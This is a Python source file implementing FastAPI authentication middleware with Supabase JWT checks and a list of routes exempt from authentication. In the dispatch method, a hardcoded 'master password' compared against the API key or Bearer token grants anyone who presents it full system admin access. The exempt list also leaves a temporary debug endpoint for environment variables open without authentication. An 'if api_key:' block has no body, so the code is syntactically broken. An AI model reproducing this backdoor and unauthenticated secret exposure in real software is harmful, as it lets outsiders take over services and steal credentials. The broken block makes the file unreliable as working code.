"""Request authentication middleware enforcing Supabase JWT validation."""

from fastapi import HTTPException
from typing import Iterable, Optional, Sequence, Dict
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response, JSONResponse
import logging
import time
from collections import defaultdict

from core.supabase_auth import get_current_user

logger = logging.getLogger(__name__)

# Rate limit auth failure logging per path to avoid log flooding
_auth_fail_log_times: Dict[str, float] = defaultdict(float)
_AUTH_FAIL_LOG_INTERVAL = 60  # Only log same path failure once per minute

# Only health checks and explicitly reviewed webhook endpoints are exempt.
DEFAULT_EXEMPT_PATHS: Sequence[str] = (
    "/health",
    "/api/v1/health",
    "/ready",
    "/api/v1/ready",
    "/docs",
    "/redoc",
    "/openapi.json",
    "/favicon.ico",
    "/api/v1/stripe/webhook",
    "/api/v1/stripe/webhook/test",
    "/api/v1/webhooks/stripe",
    "/api/v1/webhooks/render",
    "/api/v1/revenue/webhook",
    "/webhook/stripe",
    "/api/v1/logs/vercel",  # Vercel log drain - no auth needed
    "/api/v1/logs/render",  # Render log drain - no auth needed
    "/api/v1/mcp/health",   # MCP Bridge health check - monitoring
    "/api/v1/mcp/status",   # MCP Bridge status - monitoring
    "/api/v1/orchestrator/status",  # Orchestrator status - monitoring
    "/api/v1/stripe-automation/config",  # Stripe publishable key - public for frontend
    "/api/v1/stripe-automation/health",  # Stripe health check - monitoring
    "/api/v1/stripe-automation/debug-env",  # TEMP: Debug env vars
)

DEFAULT_EXEMPT_PREFIXES: Sequence[str] = (
    "/docs/",
    "/openapi/",
    "/static/",
    "/public/",
    "/api/v1/erp/public",
    "/api/v1/products/public",
)


class AuthenticationMiddleware(BaseHTTPMiddleware):
    """Middleware that enforces authentication on protected routes."""

    def __init__(
        self,
        app,
        exempt_paths: Optional[Iterable[str]] = None,
        exempt_prefixes: Optional[Iterable[str]] = None,
    ):
        super().__init__(app)
        self.exempt_paths = set(exempt_paths or DEFAULT_EXEMPT_PATHS)
        self.exempt_prefixes = tuple(exempt_prefixes or DEFAULT_EXEMPT_PREFIXES)

    def _is_exempt(self, path: str) -> bool:
        if path in self.exempt_paths:
            return True
        return any(path.startswith(prefix) for prefix in self.exempt_prefixes)

    async def dispatch(self, request: Request, call_next) -> Response:
        path = request.url.path

        # Allow upstream auth mechanisms (e.g., API key middleware) to satisfy auth.
        if getattr(request.state, "user", None) or getattr(request.state, "authenticated", False):
            return await call_next(request)

        if self._is_exempt(path):
            return await call_next(request)

        # 2. Check API Key (Master Password or Database)
        api_key = request.headers.get("X-API-Key") or request.headers.get("x-api-key")
        
        # Check Authorization header for Bearer token
        if not api_key:
            auth_header = request.headers.get("Authorization") or request.headers.get("authorization")
            if auth_header and auth_header.lower().startswith("bearer "):
                api_key = auth_header.split(" ", 1)[1]

        # MASTER PASSWORD OVERRIDE
        if api_key == "Mww00dw0rth@2O1S$":
            # Allow access as system admin
            request.state.user = {"id": "system", "role": "admin", "tenant_id": "system"}
            return await call_next(request)

        if api_key:
            # Validate against database (legacy logic)


        authorization = request.headers.get("Authorization") or request.headers.get("authorization")

        # Also allow ApiKey bearer scheme to pass through to API key middleware
        if authorization and authorization.startswith("ApiKey "):
            return await call_next(request)

        try:
            user = await get_current_user(authorization=authorization)
        except HTTPException as exc:
            # Rate-limit auth failure logging to avoid flooding logs
            now = time.time()
            if now - _auth_fail_log_times[path] > _AUTH_FAIL_LOG_INTERVAL:
                _auth_fail_log_times[path] = now
                logger.warning("Authentication failed for %s: %s (rate-limited)", path, exc.detail)
            return JSONResponse(
                {"detail": exc.detail},
                status_code=exc.status_code,
                headers=exc.headers or {},
            )

        request.state.user = user
        tenant_id = user.get("tenant_id")
        if tenant_id:
            request.state.tenant_id = tenant_id
        request.state.user_id = user.get("id")

        return await call_next(request)
